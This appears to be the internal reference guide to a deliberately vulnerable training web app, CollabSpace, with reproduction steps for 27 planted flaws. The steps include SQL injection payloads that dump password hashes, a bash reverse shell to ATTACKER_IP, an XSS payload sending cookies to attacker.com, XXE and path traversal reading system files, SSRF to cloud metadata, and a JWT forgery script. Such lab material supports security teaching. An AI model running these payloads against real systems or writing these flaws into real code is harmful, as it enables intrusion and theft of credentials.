# CollabSpace — Vulnerabilities Reference Guide

> **FOR INTERNAL / TRAINING USE ONLY.** Do not deploy in production or expose to the internet.

This document details every intentional vulnerability in CollabSpace, its exact location, and step-by-step reproduction instructions.

---

## Vulnerability Index

| # | Category | Name | Difficulty | Location |
|---|----------|------|-----------|----------|
| 1 | Injection | SQL Injection in project search | Medium | `app/routers/projects.py:99` |
| 2 | Injection | SQL Injection via admin query executor | Medium | `app/routers/admin.py:93` |
| 3 | Injection | Command Injection in backup endpoint | Hard | `app/routers/internal.py:65-73` |
| 4 | XSS | Stored XSS via task comments | Medium | `app/templates/project_detail.html:154` |
| 5 | XSS | Stored XSS via user bio | Medium | `app/templates/profile.html` |
| 6 | XSS | Reflected XSS in project search | Medium | `app/templates/projects.html:109` |
| 7 | Broken Access Control | IDOR — read any user's profile + API key | Medium | `app/routers/profile.py:46` |
| 8 | Broken Access Control | IDOR — read/edit/delete any task | Medium | `app/routers/tasks.py:61` |
| 9 | Broken Access Control | IDOR — download/delete any file | Medium | `app/routers/files.py:56` |
| 10 | Broken Access Control | Missing admin check on user listing | Medium | `app/routers/admin.py:49` |
| 11 | Broken Access Control | Task ownership transfer without auth | Hard | `app/routers/tasks.py:89` |
| 12 | CSRF | State-changing GET endpoint (API key revoke) | Medium | `app/routers/profile.py:107` |
| 13 | SSRF | Server-Side Request Forgery via webhook tester | Medium | `app/routers/profile.py:84` |
| 14 | SSRF | SSRF via admin URL fetcher | Hard | `app/routers/admin.py:78` |
| 15 | Open Redirect | Unvalidated `next` parameter on login | Medium | `app/templates/login.html:37` |
| 16 | File Upload | Unrestricted file upload for avatars | Medium | `app/routers/profile.py:68` |
| 17 | Mass Assignment | Role escalation via profile update | Medium-Hard | `app/routers/profile.py:54` |
| 18 | Race Condition | API key generation TOCTOU | Hard | `app/routers/profile.py:96` |
| 19 | Path Traversal | Arbitrary file read via download path param | Hard | `app/routers/files.py:73` |
| 20 | XXE | XML External Entity in file processing | Hard | `app/routers/files.py:102` |
| 21 | Sensitive Data Exposure | Debug endpoint leaks SECRET_KEY + env vars | Medium | `app/routers/internal.py:21` |
| 22 | Security Misconfiguration | Hardcoded JWT secret key | Easy-Med | `app/config.py:18` |
| 23 | Security Misconfiguration | Full stack traces in error responses | Easy-Med | `app/main.py:40-52` |
| 24 | Security Misconfiguration | Permissive CORS (`*`) | Easy-Med | `app/config.py:28` |
| 25 | Broken Auth | Brute-forceable 6-digit password reset token | Hard | `app/auth.py:34` |
| 26 | Broken Auth | Reset token returned in API response | Medium | `app/routers/auth.py:96` |
| 27 | Cryptographic Failure | Bcrypt rounds set to 4 (too low) | Medium | `app/config.py:33` |

---

## Detailed Reproduction Steps

---

### 1. SQL Injection — Project Search
**File:** `app/routers/projects.py`, route `GET /api/projects/search`
**Vulnerable code (line ~93):**
```python
query = f"SELECT * FROM projects WHERE name LIKE '%{q}%' OR description LIKE '%{q}%'"
result = db.execute(text(query))
```
**Why it's vulnerable:** The `q` parameter is concatenated directly into the SQL string without parameterization.
**Database:** PostgreSQL. `SELECT *` on the `projects` table returns **7 columns** in order: `id` (int), `name` (varchar), `description` (text), `owner_id` (int), `is_private` (boolean), `created_at` (timestamp), `updated_at` (timestamp). All UNION SELECT payloads must match this column count and respect type compatibility (use `NULL` for int/bool/timestamp positions).
**Difficulty:** Medium — requires knowing the endpoint exists.

**Reproduce:**

**Step 1 — Determine column count using ORDER BY (no guessing):**
```bash
# Increase the number until you get an error — error at 8 means 7 columns
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=%27%20ORDER%20BY%207--"
# → 200 OK  (7 columns confirmed)

curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=%27%20ORDER%20BY%208--"
# → 500 error  (column 8 does not exist)
```

**Step 2 — Dump all projects (bypass WHERE clause):**
```bash
# ' OR 1=1-- : the -- comments out the rest of the query
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=%27%20OR%201%3D1--"
```

**Step 3 — Enumerate tables (PostgreSQL information_schema):**
```bash
# 7-column UNION — string values in positions 2 and 3, NULL for the rest
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=%27%20UNION%20SELECT%20NULL%2Ctable_name%2Ctable_schema%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20information_schema.tables--"
```
Decoded payload: `' UNION SELECT NULL,table_name,table_schema,NULL,NULL,NULL,NULL FROM information_schema.tables--`

**Step 4 — Exfiltrate user credentials (7-column, type-safe):**
```bash
# Concatenate username and hash into the 'name' column (position 2)
# Positions 4 (int), 5 (bool), 6 (timestamp), 7 (timestamp) must be NULL
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/projects/search?q=%27%20UNION%20SELECT%20id%2Cusername%7C%7C%27%3A%27%7C%7Chashed_password%2Cemail%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20users--"
```
Decoded payload: `' UNION SELECT id,username||':'||hashed_password,email,NULL,NULL,NULL,NULL FROM users--`
The `||` operator is PostgreSQL string concatenation. Results appear in the `name` and `description` fields of each returned row.

---

### 2. SQL Injection — Admin Query Executor
**File:** `app/routers/admin.py`, route `POST /api/admin/execute-query`
**Vulnerable code (line ~93):**
```python
result = db.execute(text(query))
```
**Why it's vulnerable:** Executes arbitrary SQL supplied by the user. Has no authentication check (see also vuln #10).
**Difficulty:** Medium — endpoint is discoverable via API docs or source review.

**Reproduce:**
```bash
# No auth needed — endpoint has no authentication check.
# Use --data-urlencode to ensure the SQL is properly form-encoded.

# Dump all user credentials
curl -X POST "http://localhost:8000/api/admin/execute-query" \
  --data-urlencode "query=SELECT id, username, email, hashed_password FROM users"

# Elevate any account to admin
curl -X POST "http://localhost:8000/api/admin/execute-query" \
  --data-urlencode "query=UPDATE users SET role='admin' WHERE username='youruser'"

# Verify the escalation
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/auth/me"
```

---

### 3. Command Injection — Backup Path
**File:** `app/routers/internal.py`, route `POST /api/internal/backup`
**Vulnerable code (lines 65-73):**
```python
command = f"pg_dump -h {host} -U {user_pass[0]} {host_db[1]} > {path}"
result = subprocess.run(command, shell=True, ...)
```
**Why it's vulnerable:** `path` parameter is inserted directly into a shell command with `shell=True`. No authentication required.
**Difficulty:** Hard — endpoint is under `/api/internal/` which suggests it's "private".

**Reproduce:**
```bash
# Read /etc/passwd
curl -X POST "http://localhost:8000/api/internal/backup?path=/tmp/x;cat+/etc/passwd"

# Reverse shell (Linux)
curl -X POST "http://localhost:8000/api/internal/backup?path=/tmp/x;bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER_IP/4444+0>%261'"
```

---

### 4. Stored XSS — Task Comments
**File:** `app/templates/project_detail.html`, `loadComments()` function (~line 154)
**Vulnerable code:**
```javascript
html += `<div class="comment-item">
    <div class="comment-author">${escapeHTML(c.author_username)}</div>
    <div class="comment-content">${c.content}</div>   <!-- No escaping! -->
</div>`;
list.innerHTML = html;
```
**Why it's vulnerable:** `c.content` is injected into `innerHTML` without sanitization. The author name is escaped, but the comment body is not.
**Difficulty:** Medium — requires finding the comments feature, which is only visible when you click the comment button on a task.

**Reproduce:**
1. Log in and navigate to any project with a task.
2. Click the 💬 button on a task to open the comment panel.
3. Post a comment with the payload:
   ```
   <img src=x onerror="alert(document.cookie)">
   ```
4. The payload fires immediately when the comment is rendered.
5. For persistent exfiltration:
   ```
   <img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">
   ```
6. Every other user who views this task's comments will execute the payload.

---

### 5. Stored XSS — User Bio
**File:** `app/templates/profile.html`, `updateProfile()` function and initial render
**Vulnerable code:**
```javascript
document.getElementById('bioDisplay').innerHTML =
  `<p class="text-muted">Bio preview: ${data.bio}</p>`;
```
**Why it's vulnerable:** `data.bio` comes from the server (stored in DB) and is inserted into `innerHTML` without sanitization.
**Difficulty:** Medium — the bio is only visible on the profile page and requires knowing where it's rendered.

**Reproduce:**
1. Go to `/profile`.
2. Set your bio to:
   ```
   <img src=x onerror="alert(document.cookie)">
   ```
3. Click "Save changes" — alert fires immediately.
4. Reload the page — alert fires again (stored payload).
5. If another admin views your profile via the lookup tool, the payload also fires in their browser.

---

### 6. Reflected XSS — Project Search
**File:** `app/templates/projects.html`, `searchProjects()` function (~line 109)
**Vulnerable code:**
```javascript
banner.innerHTML = `Found <strong>${data.results.length}</strong> result(s) for: ${data.query}`;
```
**Why it's vulnerable:** `data.query` is the search string returned by the server and inserted into `innerHTML` without escaping.
**Difficulty:** Medium — the attacker needs to trick a logged-in user into visiting a crafted URL or typing a payload into the search box.

**Reproduce:**
1. Log in and navigate to `/projects`.
2. In the search box, type:
   ```
   <img src=x onerror=alert(document.domain)>
   ```
3. The banner renders the payload and the alert fires.
4. For reflected delivery, share a URL with an auto-triggered search (requires minor JS interaction since search is triggered by input events).

---

### 7. IDOR — Any User Profile + API Key
**File:** `app/routers/profile.py`, route `GET /api/users/{user_id}`
**Vulnerable code (line ~46):**
```python
user = db.query(models.User).filter(models.User.id == user_id).first()
return { "id": ..., "email": ..., "role": ..., "api_key": user.api_key, ... }
```
**Why it's vulnerable:** No check that `user_id == current_user.id`. Returns sensitive fields including `api_key`, `email`, and `role` for any user.
**Difficulty:** Medium — user IDs are sequential and visible throughout the UI (task pages, project pages).

**Reproduce:**
```bash
# Enumerate all users and steal their API keys
for id in 1 2 3 4 5; do
  curl -s -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/$id"
done

# Direct access
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/users/1"
```

---

### 8. IDOR — Task Read/Update/Delete
**File:** `app/routers/tasks.py`, routes `GET/PUT/DELETE /api/tasks/{task_id}`
**Why it's vulnerable:** All task endpoints use only authentication (`get_current_active_user`) — no ownership or project-membership check.

**Reproduce:**
```bash
# Read any task
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/tasks/1"

# Delete any task (even from a project you don't belong to)
curl -X DELETE -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/tasks/5"

# Update task status on someone else's project
curl -X PUT -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/tasks/3" \
  -H "Content-Type: application/json" \
  -d '{"status": "done"}'
```

---

### 9. IDOR — File Read/Download/Delete
**File:** `app/routers/files.py`, routes `GET/DELETE /api/files/{file_id}` and `GET /api/files/{file_id}/download`
**Why it's vulnerable:** No check that the requester belongs to the file's project.

**Reproduce:**
```bash
# Download any file by its ID
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download" -O

# Delete a file from another project
curl -X DELETE -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/2"
```

---

### 10. Missing Admin Check — User Listing
**File:** `app/routers/admin.py`, route `GET /api/admin/users`
**Vulnerable code (line ~49):**
```python
@router.get("/api/admin/users")
async def list_all_users(
    current_user: models.User = Depends(get_current_active_user),  # Should be require_admin
    ...
```
**Why it's vulnerable:** Uses `get_current_active_user` instead of `require_admin`. Any authenticated member can list all users, including their emails and API keys.

**Reproduce:**
```bash
# As a regular member account
curl -b "token=<MEMBER_TOKEN>" "http://localhost:8000/api/admin/users"
```

---

### 11. Task Ownership Transfer — No Authorization
**File:** `app/routers/tasks.py`, route `POST /api/tasks/{task_id}/transfer`
**Why it's vulnerable:** Any authenticated user can reassign any task's `created_by` to themselves without being the original creator or a project member.

**Reproduce:**
```bash
# Claim ownership of task #5
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/tasks/5/transfer?new_owner_id=<YOUR_USER_ID>"
```

---

### 12. CSRF — State-Changing GET (API Key Revoke)
**File:** `app/routers/profile.py`, route `GET /api/profile/revoke-api-key`
**Vulnerable code (line ~107):**
```python
@router.get("/api/profile/revoke-api-key")
async def revoke_api_key_csrf(...):
    current_user.api_key = None
    db.commit()
```
**Why it's vulnerable:** GET requests that change server state are exempt from SameSite=Lax CSRF protection because browsers send cookies on cross-origin GET navigations. An attacker can trigger the endpoint via an `<img>` or `<link>` tag on any page the victim visits.
**Difficulty:** Medium — requires understanding of SameSite=Lax behavior.

**Reproduce:**
1. Attacker hosts a page containing:
   ```html
   <img src="http://localhost:8000/api/profile/revoke-api-key" width="0" height="0">
   ```
2. Victim (logged-in user) visits the attacker's page.
3. The victim's API key is silently revoked.

---

### 13. SSRF — Webhook URL Tester
**File:** `app/routers/profile.py`, route `POST /api/profile/webhook/test`
**Vulnerable code (line ~84):**
```python
resp = await client.post(webhook_url, json={...})
```
**Why it's vulnerable:** `webhook_url` is taken directly from the request body with no validation. Any URL is accepted, including internal service addresses.
**Difficulty:** Medium — available to all authenticated users.

**Important note on HTTP method:** The webhook tester always sends a **POST** request (`client.post(...)`). Internal endpoints that only accept GET (like `/api/internal/debug`) will return 405 Method Not Allowed — no data will be leaked through them via this vector. Target POST-accepting internal endpoints instead.

**Reproduce:**
```bash
# 1. Create a backdoor admin account via SSRF → internal create-admin (no auth required)
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/webhook/test" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://localhost:8000/api/internal/create-admin?username=hacker&password=hacked123"}'
# Response: {"status": 200, "response": "{\"message\": \"Emergency admin created\", \"user_id\": ...}"}

# 2. Confirm the backdoor user was created, then login as hacker:admin
curl -X POST "http://localhost:8000/api/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "hacker", "password": "hacked123"}'

# 3. Internal port scanning (observe: timeout = filtered, connection refused = closed, fast response = open)
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/webhook/test" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5432"}'
# Fast error → PostgreSQL port is open inside the container

# 4. Cloud metadata (AWS IMDSv1 — POST is accepted by some metadata services)
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/webhook/test" \
  -H "Content-Type: application/json" \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'
```

**To access GET-only internal endpoints** (e.g., the debug endpoint that leaks `SECRET_KEY`), use the **Admin SSRF (Vuln #14)** which sends GET requests — see below.

---

### 14. SSRF — Admin URL Fetcher
**File:** `app/routers/admin.py`, route `POST /api/admin/fetch-url`
**Why it's vulnerable:** The `url` query parameter is passed directly to `httpx.AsyncClient().get(url)` — a **GET** request. Only accessible to admins, but once admin access is obtained (via vuln #17 mass assignment or vuln #2 SQL injection), this enables reading any internal GET endpoint including the unauthenticated debug endpoint.
**Difficulty:** Hard — requires prior privilege escalation.

**Reproduce:**
```bash
# Step 1 — Gain admin access first (use Vuln #17 mass assignment)
curl -X PUT -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/update" \
  -H "Content-Type: application/json" \
  -d '{"role": "admin"}'

# Step 2 — Leak SECRET_KEY and all environment variables via the debug endpoint
# (This works because this SSRF sends GET — unlike the webhook SSRF which sends POST)
curl -X POST -b "token=<ADMIN_TOKEN>" \
  "http://localhost:8000/api/admin/fetch-url?url=http://localhost:8000/api/internal/debug"

# Step 3 — Read all active sessions (user IDs, emails, API keys)
curl -X POST -b "token=<ADMIN_TOKEN>" \
  "http://localhost:8000/api/admin/fetch-url?url=http://localhost:8000/api/internal/sessions"

# Cloud provider metadata
curl -X POST -b "token=<ADMIN_TOKEN>" \
  "http://localhost:8000/api/admin/fetch-url?url=http://169.254.169.254/latest/meta-data/"
```

---

### 15. Open Redirect — Login `?next=` Parameter
**File:** `app/templates/login.html`, `handleLogin()` function (~line 37)
**Vulnerable code:**
```javascript
const params = new URLSearchParams(window.location.search);
const redirectTo = params.get('next') || '/dashboard';
window.location.href = redirectTo;  // No validation — can be external URL
```
**Why it's vulnerable:** The `next` parameter is read from the URL and used as a redirect target after login without checking whether it points to the same origin.
**Difficulty:** Medium — easy to miss in a code review; requires social engineering to exploit.

**Reproduce:**
1. Send the victim this link:
   ```
   http://localhost:8000/login?next=https://attacker.com/phishing
   ```
2. The victim logs in normally.
3. After authentication succeeds, they are redirected to `https://attacker.com/phishing` — attacker's site.

---

### 16. Insecure File Upload — Avatar (No Validation)
**File:** `app/routers/profile.py`, route `POST /api/profile/avatar`
**Vulnerable code (line ~68):**
```python
filename = file.filename          # Unsanitized
file_path = upload_dir / filename # Path traversal possible
with open(file_path, "wb") as buffer:
    shutil.copyfileobj(file.file, buffer)
current_user.avatar = f"/static/avatars/{filename}"
```
**Why it's vulnerable:**
1. No content-type or file extension validation — any file type can be uploaded.
2. The original filename is used directly — a filename like `../../app/templates/pwned.html` causes a path traversal on upload.
3. SVG files with embedded JavaScript are served and rendered by browsers (stored XSS vector).
**Difficulty:** Medium — the upload endpoint is under `/api/profile/avatar`.

**Reproduce (SVG XSS):**
1. Create `evil.svg`:
   ```xml
   <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie)">
     <text>Malicious SVG</text>
   </svg>
   ```
2. Upload it as your avatar.
3. Any user who visits your profile page (and the SVG is rendered inline) executes the payload.

**Reproduce (Path Traversal on Upload):**
```bash
curl -X POST -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/avatar" \
  -F "file=@shell.html;filename=../../templates/pwned.html"
```

---

### 17. Mass Assignment — Role Escalation via Profile Update
**File:** `app/routers/profile.py`, route `PUT /api/profile/update`
**Vulnerable code (line ~54):**
```python
allowed_fields = ['full_name', 'bio', 'role']   # 'role' should NOT be here
for field in allowed_fields:
    if field in data:
        setattr(current_user, field, data[field])
```
**Why it's vulnerable:** The `role` field is included in the list of allowed profile fields. Any authenticated user can set their own role to `admin`.
**Difficulty:** Medium-Hard — requires reading the API or observing that `role` is accepted in the update payload.

**Reproduce:**
```bash
# Escalate your own account to admin
curl -X PUT -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/profile/update" \
  -H "Content-Type: application/json" \
  -d '{"bio": "hello", "role": "admin"}'

# Verify
curl -b "token=<YOUR_TOKEN>" "http://localhost:8000/api/auth/me"
```

---

### 18. Race Condition — API Key Generation (TOCTOU)
**File:** `app/routers/profile.py`, route `POST /api/profile/generate-api-key`
**Vulnerable code (line ~96):**
```python
if current_user.api_key:                 # Check
    return {"api_key": current_user.api_key}

time.sleep(0.15)                          # Processing delay widens the race window

new_key = secrets.token_hex(24)
current_user.api_key = new_key            # Act (no lock held)
db.commit()
```
**Why it's vulnerable:** The check-then-act sequence is not atomic. Two concurrent requests can both pass the `if` check before either one commits, resulting in two different keys being issued. The second write overwrites the first, causing the first caller to hold an invalid key they just received.
**Difficulty:** Hard — requires timing concurrent requests precisely.

**Reproduce (Python):**
```python
import requests, threading, json

TOKEN = "your_jwt_token_here"
URL = "http://localhost:8000/api/profile/generate-api-key"
headers = {"Cookie": f"token={TOKEN}"}
results = []

def make_request():
    r = requests.post(URL, headers=headers)
    results.append(r.json().get("api_key"))

threads = [threading.Thread(target=make_request) for _ in range(10)]
[t.start() for t in threads]
[t.join() for t in threads]

# Multiple distinct keys should appear, but only the last one is valid
print(set(results))
```

---

### 19. Path Traversal — File Download
**File:** `app/routers/files.py`, route `GET /api/files/{file_id}/download`
**Vulnerable code (lines ~73-80):**
```python
if path:
    file_path = os.path.join(settings.UPLOAD_DIR, path)  # No normalization
    return FileResponse(path=file_path, ...)
```
**Why it's vulnerable:** The optional `path` query parameter is joined to the upload directory with `os.path.join`, which does not prevent traversal sequences. On Linux/Docker, absolute paths in `path` override the base entirely.
**Difficulty:** Hard — the `path` parameter is not documented and requires source reading to discover.

**Reproduce:**
```bash
# Read app configuration (relative traversal)
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=../../app/config.py" \
  --output config.py

# Read /etc/passwd (absolute path override on Linux)
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=/etc/passwd" \
  --output passwd.txt

# Read the JWT secret key directly
curl -b "token=<YOUR_TOKEN>" \
  "http://localhost:8000/api/files/1/download?path=../../.env"
```

---

### 20. XXE — XML External Entity in File Processing
**File:** `app/routers/files.py`, route `POST /api/files/process`
**Vulnerable code (lines ~102-114):**
```python
from lxml import etree
parser = etree.XMLParser(resolve_entities=True, no_network=False)
tree = etree.fromstring(content, parser)
```
**Why it's vulnerable:** `lxml` is configured with `resolve_entities=True` and `no_network=False`, enabling external entity expansion. An attacker can read local files or trigger SSRF by uploading a crafted XML file.
**Difficulty:** Hard — requires uploading an XML file to a project, then calling the process endpoint.

**Reproduce:**
1. Create `evil.xml`:
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE foo [
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <root>
     <data>&xxe;</data>
   </root>
   ```
2. Upload `evil.xml` to any project via the file upload form.
3. Note the file ID returned.
4. Call the process endpoint:
   ```bash
   curl -X POST -b "token=<YOUR_TOKEN>" \
     "http://localhost:8000/api/files/process?file_id=<FILE_ID>"
   ```
5. The contents of `/etc/passwd` are reflected in the server response or an error message.

**SSRF via XXE:**
```xml
<!DOCTYPE foo [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&ssrf;</data></root>
```

---

### 21. Sensitive Data Exposure — Debug Endpoint
**File:** `app/routers/internal.py`, route `GET /api/internal/debug`
**Vulnerable code (line ~21):**
```python
return {
    "database_url": settings.DATABASE_URL,   # Contains DB credentials
    "secret_key": settings.SECRET_KEY,        # JWT signing key
    "upload_dir": settings.UPLOAD_DIR,
    "environment": dict(os.environ)           # All environment variables
}
```
**Why it's vulnerable:** No authentication required. Returns the JWT signing key, database URL with credentials, and the entire process environment.
**Difficulty:** Medium — the path is under `/api/internal/` suggesting it's internal-only, making it slightly harder to find.

**Reproduce:**
```bash
# No token needed
curl "http://localhost:8000/api/internal/debug"

# Extract the SECRET_KEY
curl -s "http://localhost:8000/api/internal/debug" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['secret_key'])"
```

**Impact:** With the `SECRET_KEY`, an attacker can forge valid JWT tokens for any user, including admin accounts.

---

### 22. Hardcoded JWT Secret Key
**File:** `app/config.py`, line 18
```python
SECRET_KEY: str = "dev-secret-key-2023-collabspace-jwt-token"
```
**Why it's vulnerable:** Predictable, hardcoded secret key. Combined with vuln #21 (exposed via debug endpoint), attackers can forge JWT tokens.

**Exploit (forge admin token):**
```python
from jose import jwt
from datetime import datetime, timedelta

SECRET = "dev-secret-key-2023-collabspace-jwt-token"
payload = {"sub": "admin_username", "exp": datetime.utcnow() + timedelta(days=365)}
token = jwt.encode(payload, SECRET, algorithm="HS256")
print(token)
```

---

### 23. Verbose Error Responses — Full Stack Traces
**File:** `app/main.py`, lines 40-52
```python
return JSONResponse(
    content={
        "error": str(exc),
        "type": type(exc).__name__,
        "traceback": traceback.format_exc(),   # Full Python traceback
        "path": str(request.url),
        "method": request.method
    }
)
```
**Why it's vulnerable:** Any unhandled exception returns a full Python traceback, revealing file paths, library versions, database schema details, and application internals.

**Reproduce:** Trigger an error by passing an unexpected payload to any endpoint. The response will include the full traceback.

---

### 24. Permissive CORS — Allow All Origins
**File:** `app/config.py`, line 28 / `app/main.py`
```python
CORS_ORIGINS: list = ["*"]
allow_credentials=True
```
**Why it's vulnerable:** `Access-Control-Allow-Origin: *` combined with `allow_credentials=True` allows any website to make authenticated cross-origin requests, enabling cookie theft and CSRF-style attacks from JavaScript.

---

### 25. Brute-Forceable Password Reset Token
**File:** `app/auth.py`, lines 34-36
```python
def generate_reset_token() -> str:
    token = ''.join(random.choices(string.digits, k=settings.RESET_TOKEN_LENGTH))  # 6 digits
    return token
```
**Why it's vulnerable:** Only 10^6 = 1,000,000 possible values. No rate limiting on token verification. Brute-forceable in minutes.
**Difficulty:** Hard — requires knowing the target's email and that they have an active reset request.

**Reproduce:**
```python
import requests

TARGET_EMAIL = "admin@collabspace.io"
BASE = "http://localhost:8000"

# First trigger a reset (optional if one already exists)
requests.post(f"{BASE}/api/auth/reset-password",
              json={"email": TARGET_EMAIL})

# Brute-force all 6-digit tokens
for i in range(1000000):
    token = str(i).zfill(6)
    r = requests.post(f"{BASE}/api/auth/confirm-reset", json={
        "email": TARGET_EMAIL,
        "token": token,
        "new_password": "NewPass123!"
    })
    if r.status_code == 200:
        print(f"[+] Token found: {token}")
        break
```

---

### 26. Reset Token Returned in API Response
**File:** `app/routers/auth.py`, line ~96
```python
return {"message": "Reset token generated", "token": reset_token}
```
**Why it's vulnerable:** The reset token is returned directly in the HTTP response instead of being sent to the user's email. Any attacker who can observe the response (e.g., via a MITM or if the endpoint is called on the victim's behalf) obtains the token immediately.

**Reproduce:**
```bash
curl -X POST "http://localhost:8000/api/auth/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"email": "victim@company.com"}'
# Response contains {"message": "...", "token": "123456"}
```

---

### 27. Weak Bcrypt Rounds
**File:** `app/config.py`, line 33
```python
PASSWORD_HASH_ROUNDS: int = 4
```
**Why it's vulnerable:** NIST recommends a minimum of 10 rounds. Using 4 rounds makes password cracking ~64× faster than using 10 rounds. Combined with the stolen hashes from vuln #1 or #2, passwords can be cracked rapidly.

---

## Chained Attack Scenarios

### Scenario A: Unauthenticated to Admin RCE
1. **Vuln #21** — `GET /api/internal/debug` → steal `SECRET_KEY`
2. **Vuln #22** — forge an admin JWT token
3. **Vuln #14** — `POST /api/admin/fetch-url` → SSRF to confirm internal access
4. **Vuln #3** — `POST /api/internal/backup?path=...;SHELL_CMD` → Remote Code Execution

### Scenario B: Member to Admin
1. Register a member account
2. **Vuln #17** — `PUT /api/profile/update` with `{"role": "admin"}` → become admin
3. Access all admin endpoints

### Scenario C: Account Takeover via XSS
1. **Vuln #4** — Post a comment with cookie-stealing payload
2. Victim loads the task → their session cookie is sent to attacker
3. Attacker uses stolen cookie to authenticate as victim

### Scenario D: Data Exfiltration via SQLi
1. **Vuln #2** — `POST /api/admin/execute-query` (no auth needed): `curl -X POST http://localhost:8000/api/admin/execute-query --data-urlencode "query=SELECT id,username,email,hashed_password FROM users"`
2. All credentials are returned in plaintext JSON
3. **Vuln #27** — Crack bcrypt hashes using hashcat or john (only 4 rounds — ~64× faster than standard 10 rounds)

---

*This document is part of the CollabSpace security training platform.*
